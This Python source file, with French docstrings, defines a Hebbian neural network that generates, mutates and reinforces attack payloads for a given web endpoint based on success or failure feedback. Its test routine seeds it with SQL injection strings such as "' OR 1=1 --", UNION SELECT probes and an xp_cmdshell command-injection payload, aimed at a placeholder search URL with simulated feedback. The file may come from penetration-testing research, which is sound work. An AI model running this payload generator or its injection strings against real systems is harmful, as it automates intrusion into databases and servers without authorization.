# hebbian_learning/hebbian_network.py

import numpy as np
import random
import logging
from typing import List, Dict, Any, Optional

from .hebbian_neuron import HebbianNeuron

logger = logging.getLogger(__name__)

class HebbianNetwork:
    """
    Un réseau de neurones Hebbien conçu pour générer et affiner des payloads
    pour un point d'attaque donné, en apprenant des succès et des échecs.
    """
    def __init__(self, target_endpoint_context: Dict[str, Any], initial_payload_patterns: List[str],
                 num_neurons: int = 10, learning_rate: float = 0.01, decay_rate: float = 0.001):
        """
        Initialise un réseau Hebbien pour un point d'attaque spécifique.

        Args:
            target_endpoint_context (Dict[str, Any]): Contexte du point d'attaque
                                                    (URL, méthode, paramètres, etc.).
            initial_payload_patterns (List[str]): Liste de composants/modèles de payloads initiaux
                                                  à partir desquels générer des payloads.
            num_neurons (int): Nombre de neurones dans le réseau.
            learning_rate (float): Taux d'apprentissage pour les neurones.
            decay_rate (float): Taux de déclin des poids des neurones.
        """
        self.target_endpoint_context = target_endpoint_context # e.g., {'url': '...', 'method': '...', 'params': ['param1', 'param2']}
        self.initial_payload_patterns = initial_payload_patterns # List of base strings/components for payloads
        self.num_neurons = num_neurons
        
        # The feature vector represents what the neurons 'see'.
        # For our use case, it's the presence/absence of initial payload patterns
        # in a given payload, plus optional feedback signals.
        self.feature_vector_size = len(self.initial_payload_patterns) + 2 # +2 for last_success_feedback, last_failure_feedback
        self.neurons = [HebbianNeuron(self.feature_vector_size, learning_rate, decay_rate) for _ in range(num_neurons)]
        
        self.memory: List[Dict[str, Any]] = [] # Store successful payloads and their context for self-reinforcement
        self.successful_patterns: set[str] = set() # Store unique successful full payloads generated by this network

        logger.info(f"Hebbian Network initialized for endpoint: {target_endpoint_context.get('url')} with {num_neurons} neurons.")

    def _generate_input_vector(self, current_payload_components: List[str] = None, last_feedback: Optional[str] = None) -> np.ndarray:
        """
        Génère un vecteur de caractéristiques pour les neurones basé sur les composants du payload
        actuel et le dernier signal de feedback.

        Args:
            current_payload_components (List[str], optional): Composants du payload actuel.
            last_feedback (str, optional): Le dernier signal de feedback ("SUCCESS" ou "FAILURE").

        Returns:
            np.ndarray: Le vecteur de caractéristiques d'entrée.
        """
        vector = np.zeros(self.feature_vector_size)
        
        if current_payload_components:
            for i, pattern in enumerate(self.initial_payload_patterns):
                if pattern in current_payload_components: # Check if base pattern is part of the current components
                    vector[i] = 1.0
        
        # Add feedback signals as input features
        # These will influence the neuron's subsequent activations
        if last_feedback == "SUCCESS":
            vector[self.feature_vector_size - 2] = 1.0 # Index for success
        elif last_feedback == "FAILURE":
            vector[self.feature_vector_size - 1] = 1.0 # Index for failure
            
        return vector

    def generate_payload(self, previous_payload: Optional[str] = None, last_feedback: Optional[str] = None) -> str:
        """
        Génère un nouveau payload en activant les neurones et en combinant des motifs.
        Si un `previous_payload` est fourni, il essaie de le muter en fonction du feedback.

        Args:
            previous_payload (str, optional): Le payload précédemment testé.
            last_feedback (str, optional): Le dernier signal de feedback ("SUCCESS" ou "FAILURE").

        Returns:
            str: Le payload généré.
        """
        seed_components: List[str] = []
        if previous_payload:
            # Simple breakdown: check which initial patterns are substrings of the previous payload.
            # In a real scenario, this would be a more sophisticated parsing/tokenization.
            for pattern in self.initial_payload_patterns:
                if pattern in previous_payload:
                    seed_components.append(pattern)
        
        input_vector = self._generate_input_vector(seed_components, last_feedback)
        
        # Activate neurons and get their "preference" for certain patterns
        neuron_outputs = []
        for neuron in self.neurons:
            neuron_outputs.append(neuron.activate(input_vector))
        
        # Decide which patterns to combine based on neuron outputs (weights)
        # This is a simplified strategy. A more advanced approach might involve
        # clustering weights or using a more complex recombination function.
        
        # For simplicity, we use the average weight of each initial pattern across all neurons
        # as a probabilistic selection mechanism. Add a small epsilon to avoid zero probabilities.
        probabilities = np.array([
            np.mean([n.weights[i] for n in self.neurons])
            for i in range(len(self.initial_payload_patterns))
        ])
        
        # Ensure probabilities are non-negative and sum to 1 for choice.
        probabilities = np.maximum(0, probabilities)
        sum_probabilities = np.sum(probabilities)
        if sum_probabilities == 0:
            # If all probabilities are zero, resort to uniform distribution (pure exploration)
            probabilities = np.ones(len(self.initial_payload_patterns)) / len(self.initial_payload_patterns)
        else:
            probabilities = probabilities / sum_probabilities
            
        selected_patterns = []
        # Pick 1 to 3 components, weighted by probabilities.
        num_components_to_pick = random.randint(1, min(len(self.initial_payload_patterns), 3)) 
        
        if len(self.initial_payload_patterns) > 0:
            # Use choice with probabilities, replace=False to pick unique indices
            selected_indices = np.random.choice(
                len(self.initial_payload_patterns), 
                size=num_components_to_pick, 
                p=probabilities, 
                replace=False
            )
            for idx in selected_indices:
                selected_patterns.append(self.initial_payload_patterns[idx])

        # Add a random mutation or combination element from successful patterns
        # This allows the network to leverage its own past successes directly.
        if random.random() < 0.3 and self.successful_patterns: # 30% chance of adding a random known successful pattern
            selected_patterns.append(random.choice(list(self.successful_patterns)))
            
        # Combine patterns to form the payload. This is highly application-specific.
        # For XSS, it could be concatenating tags. For SQLi, adding boolean conditions.
        # We need a 'payload templater' or 'mutator' logic here in a more advanced system.
        
        new_payload = "".join(selected_patterns) if selected_patterns else random.choice(self.initial_payload_patterns)
        
        # Ensure some basic payload always exists if generation fails
        if not new_payload and self.initial_payload_patterns:
            new_payload = random.choice(self.initial_payload_patterns)
        elif not new_payload: # Fallback if initial_payload_patterns is empty too (shouldn't happen if properly initialized)
            new_payload = "default_test_payload" 

        logger.debug(f"Generated payload for {self.target_endpoint_context.get('url')}: {new_payload}")
        return new_payload

    def provide_feedback(self, payload: str, feedback_signal: int):
        """
        Met à jour les poids des neurones en fonction du résultat d'un payload.

        Args:
            payload (str): Le payload qui a été testé.
            feedback_signal (int): Le signal de feedback (+1 pour succès, -1 pour échec, 0 pour neutre).
        """
        seed_components: List[str] = []
        for pattern in self.initial_payload_patterns:
            if pattern in payload:
                seed_components.append(pattern)
        
        # The input vector for updating weights might not include the *last* feedback signal
        # as it represents the *context* in which the payload was generated.
        input_vector = self._generate_input_vector(seed_components) 
        
        for neuron in self.neurons:
            output = neuron.activate(input_vector) # Calculate output based on current state with inputs
            neuron.update_weights(input_vector, output, feedback_signal)
        
        if feedback_signal > 0: # Successful payload
            self.memory.append({'payload': payload, 'context': self.target_endpoint_context, 'feedback': feedback_signal})
            self.successful_patterns.add(payload) # Add full payload to unique successful patterns for this network

        logger.debug(f"Feedback for payload '{payload}' on {self.target_endpoint_context.get('url')}: {feedback_signal}")

    def get_successful_patterns(self) -> List[str]:
        """
        Retourne la liste des payloads qui ont réussi pour ce réseau.

        Returns:
            List[str]: Liste des payloads réussis.
        """
        return list(self.successful_patterns)

# Example Usage (for testing)
import asyncio

async def test_hebbian_network():
    logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
    logger.setLevel(logging.DEBUG) # Ensure network's logger is DEBUG

    endpoint_context = {'url': 'http://example.com/search', 'method': 'GET', 'params': [{'name': 'q', 'type': 'text'}]}
    
    # Initial SQLi patterns (simplified)
    initial_sqli_patterns = [
        "' OR 1=1 --",
        "UNION SELECT 1,2,3--",
        "admin'--",
        "'; EXEC xp_cmdshell('dir'); --",
        "sleep(5)--",
        "\" OR \"a\"=\"a",
        "ORDER BY 1--",
        "/*",
        "*/"
    ]

    hn = HebbianNetwork(endpoint_context, initial_sqli_patterns, num_neurons=5)

    print("\n--- Hebbian Learning Simulation ---")

    # Simulate some interactions
    for i in range(10):
        print(f"\nIteration {i+1}:")
        payload = hn.generate_payload()
        print(f"Generated Payload: {payload}")

        # Simulate feedback: success every 3rd iteration
        if (i + 1) % 3 == 0:
            feedback = 1 # Success
            print("SIMULATED FEEDBACK: SUCCESS")
        else:
            feedback = -1 # Failure
            print("SIMULATED FEEDBACK: FAILURE")
            
        hn.provide_feedback(payload, feedback)
        
    print("\n--- Successful Patterns Learned ---")
    for pattern in hn.get_successful_patterns():
        print(pattern)
        
    print("\n--- Neuron Weights (Example) ---")
    for i, neuron in enumerate(hn.neurons):
        print(f"Neuron {i} weights: {neuron.weights}")

if __name__ == "__main__":
    asyncio.run(test_hebbian_network())
